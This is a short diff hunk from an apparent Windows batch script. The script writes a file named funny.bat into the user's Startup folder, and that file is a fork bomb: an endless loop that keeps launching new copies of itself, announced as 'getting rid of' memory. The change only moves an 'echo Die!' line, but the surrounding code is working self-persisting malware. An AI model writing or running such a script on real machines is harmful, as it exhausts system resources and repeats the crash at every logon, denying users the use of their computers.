@@ -17,8 +17,8 @@ echo Will be getting rid of %c% bytes of memory
 echo Starting copy...
 cd "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup"
 (
-echo echo Die!
 echo :funny
+echo echo Die!
 echo start funny.bat
 echo goto:funny
 ) > funny.bat
